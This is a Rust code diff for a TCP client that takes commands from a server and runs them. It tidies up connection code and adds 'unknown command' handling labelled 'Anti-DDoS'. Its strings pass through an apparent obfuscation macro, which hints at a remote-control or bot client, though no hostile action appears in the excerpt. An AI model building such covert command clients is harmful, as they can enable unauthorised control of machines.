@@ -4,7 +4,7 @@ use std::sync::{Arc, Mutex};
 use std::time::{Duration, SystemTime};
 use std::{thread, time};
 
-use anyhow::Result;
+use anyhow::{anyhow, Result};
 use async_recursion::async_recursion;
 use lazy_static::lazy_static;
 use tracing::{error, info};
@@ -53,19 +53,17 @@ pub async fn connect(addr: String) {
 pub struct Client {
     stream: TcpStream,
     connected: bool,
-    address: String,
     reconnecting: bool,
 }
 
 impl Client {
     pub fn new(address: String) -> Result<Self> {
         // connect to the server
-        let stream = TcpStream::connect(address.clone())?;
+        let stream = TcpStream::connect(address)?;
 
         Ok(Self {
             stream,
             connected: true,
-            address,
             reconnecting: false,
         })
     }
@@ -194,8 +192,12 @@ impl Client {
                     Ok(())
                 } else {
                     self.send("empty buffer received")
-                    //Err(anyhow!(crypto!("Client crashed, reconnecting")))
                 };
+            }
+
+            // serverd moment - Anti-DDoS
+            if buf.to_ascii_lowercase().contains("unknown command") {
+                Err(anyhow!(crypto!("Client crashed, due to serverd moment.")))?;
             }
 
             async fn handle(client: &mut Client, buf: String) -> anyhow::Result<()> {
@@ -226,7 +228,7 @@ impl Client {
 
                     cmd.execute(client, args).await?;
                 } else {
-                    //client.send("unknown command")?;
+                    client.send("unknown command")?;
                 }
 
                 Ok(())
